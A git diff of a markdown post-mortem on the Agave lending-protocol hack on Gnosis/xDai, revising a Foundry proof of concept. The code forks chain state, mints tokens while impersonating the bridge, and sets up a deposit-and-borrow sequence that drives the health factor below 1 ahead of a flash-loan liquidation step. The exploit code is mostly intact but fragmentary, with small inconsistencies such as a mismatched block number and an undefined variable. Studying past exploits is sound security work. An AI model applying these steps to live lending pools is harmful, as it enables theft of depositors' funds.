@@ -1,32 +1,48 @@
 # Agave 
 
-## Whats agave?
+## What's Agave?
 
 Agave ($AGVE) is a decentralized money market protocol on the xDai chain, developed by the 1Hive community as a fork of Aave. Agave integrates features from 1Hive projects like Celeste and Honeyswap.
 
 Users deposit tokens, receiving 'aTokens' that accrue interest and can be used as collateral for borrowing. This enables leveraged returns with lower fees than mainnet Ethereum. Agave expands 1Hive's offerings, allowing users to earn yield on Honeyswap liquidity tokens. Explore Agave's capabilities, including lending, borrowing, delegated borrowing, and flash loans/
 
-## lost?
+## Amount stolen
 
 1.5 million usd
 
-## poc 
+## proof of concept (PoC) 
 
+We begin by forking the contract state before initiating any hack, to create a replicated environment that mirrors the state of the smart contract at the time before the exploit happened
+
+The code initializes variables related to the lending pool addresses provider, lending pool, and price oracle using the Gnosis forked state.
+
+**`vm.startPrank`** is used to set an address as the **`msg.sender`**, by setting it to the gnosis bridge address we can simulate real transactions.
+Finally, we establish the initial state of the contract by minting the original amounts of WETH and LINK tokens.
+
+
+ 
 ```solidity
+   // SPDX-License-Identifier: UNLICENSED
+   pragma solidity ^0.8.10;
+
    function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
         providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
         lendingPool = ILendingPool(providerAddrs.getLendingPool());
         priceOracle = IPriceOracleGetter(providerAddrs.getPriceOracle());
         console.log(providerAddrs.getPriceOracle());
+
         //Lets just mint weth to this contract for initial debt
         vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d); //the gnosis bridge address.
+        address aweth = 0xb5A165d9177555418796638447396377Edf4C18a; //Asset Address 
         wethLiqBeforeHack = getAvailableLiquidity(weth);
+
         //Mint initial weth funding
         WETH.mint(address(this), 2728.934387414251504146 ether);
         WETH.mint(address(this), 1);
+
         // Mint LINK funding
-        LINK.mint(address(this), linkLendNum1);
+        LINK.mint(address(this), 1_000_000_000_000_000_100);
         vm.stopPrank();
 
         //Approve funds
@@ -34,9 +50,78 @@ Users deposit tokens, receiving 'aTokens' that accrue interest and can be used a
         WETH.approve(address(lendingPool), type(uint256).max);
     }
 ```
+```solidity
+    function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
+        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
+        reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
+    }
+
+    function getHealthFactor() public view returns (uint256) {
+        (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
+        return healthFactor;
+    }
+```
 
 
+ ### Prepare Phase:
 
+
+#### Initial Condition - Health Factor Above 1
+
+**Objective:** 
+Ensure that the health factor is initially slightly above 1.
+
+**Reasoning:**
+The health factor is important in DeFi platforms, especially those involving lending and borrowing. It is a measure of an account's collateralization level, indicating the ratio of the value of assets to the value of outstanding liabilities. A health factor above 1 indicates that the account has sufficient collateral to cover its liabilities.
+
+#### Liquidation Mechanism
+A liquidation mechanism in place to protect the system from insolvency. When an account's health factor falls below 1, it may become eligible for liquidation.
+
+#### Transition - Advance Time by One Hour
+This time advancement is part of a simulation scenario to trigger changes in the account's health factor or to simulate the passage of time, allowing for dynamic testing.
+
+
+#### Purpose -  Liquidation Call:
+
+To get the health factor below 1, you would typically need to ensure that the borrowed amount exceeds the collateral value. The health factor is calculated based on the ratio of collateral to debt. If this ratio falls below 1, the health factor drops below the threshold, indicating potential insolvency.
+
+- Deposit a substantial amount of LINK (1_000_000_000_000_000_100) into the lending pool, designating it as collateral
+
+- Deposit a minimal amount of WETH (1) into the lending pool, designating it as collateral.
+
+- Set both LINK and WETH as collateral assets in the lending pool, allowing them to be used as security for borrowing.
+
+- Borrow a substantial amount of LINK (700_000_000_000_000_000) from the lending pool with a borrow factor of 2. The borrow factor influences the amount that can be borrowed relative to the collateral.
+
+- Borrow a minimal amount of WETH (1) from the lending pool with a borrow factor of 2.
+
+These actions collectively set up a scenario where you have a significant LINK debt compared to the collateral, leading to a health factor below 1. 
+
+
+```solidity
+  function prepare() public {
+        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc
+
+        uint256 balance = LINK.balanceOf(address(this));
+        require(balance > 0, "no link");
+
+        //Deposit weth to aave v2 fork
+        lendingPool.deposit(link, 1_000_000_000_000_000_100, address(this), 0);
+        lendingPool.deposit(weth, 1, address(this), 0);
+
+        //Enable asset as collateral
+
+        lendingPool.setUserUseReserveAsCollateral(link, true);
+        lendingPool.setUserUseReserveAsCollateral(weth, true);
+
+        //Borrow initial setup prepare debts
+        lendingPool.borrow(link, 700_000_000_000_000_000, 2, 0, address(this));
+        lendingPool.borrow(weth, 1, 2, 0, address(this));
+
+        //Withdraw as per tx
+        lendingPool.withdraw(link, linkWithdraw5, address(this));
+    }
+```
 
 
 ```solidity
@@ -50,40 +135,6 @@ Users deposit tokens, receiving 'aTokens' that accrue interest and can be used a
     }
 ```
 
-
-
- Prepare Phase:
-   - Initial Condition: Ensure that the health factor is slightly above 1.
-   - Transition: Advance time by one hour after the initial prepare.
-   - Objective: Reduce the health factor to less than 1 in the next block.
-   - Purpose: This step is essential for the liquidation call to work, as it requires a health factor below 1.
-
-
-
-```solidity
-  function prepare() public {
-        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc
-
-        uint256 balance = LINK.balanceOf(address(this));
-        require(balance > 0, "no link");
-
-        //Deposit weth to aave v2 fork
-        lendingPool.deposit(link, linkLendNum1, address(this), 0);
-        lendingPool.deposit(weth, wethlendnum2, address(this), 0);
-
-        //Enable asset as collateral
-
-        lendingPool.setUserUseReserveAsCollateral(link, true);
-        lendingPool.setUserUseReserveAsCollateral(weth, true);
-
-        //Borrow initial setup prepare debts
-        lendingPool.borrow(link, linkDebt3, 2, 0, address(this));
-        lendingPool.borrow(weth, wethDebt4, 2, 0, address(this));
-
-        //Withdraw as per tx
-        lendingPool.withdraw(link, linkWithdraw5, address(this));
-    }
-```
 
 
     2. Flashloan and Deposit Phase:
@@ -177,7 +228,6 @@ Now the attack contract would receive a call :
             console.log("NO amount borrowed???");
         }
     }
-
 ```
 
 
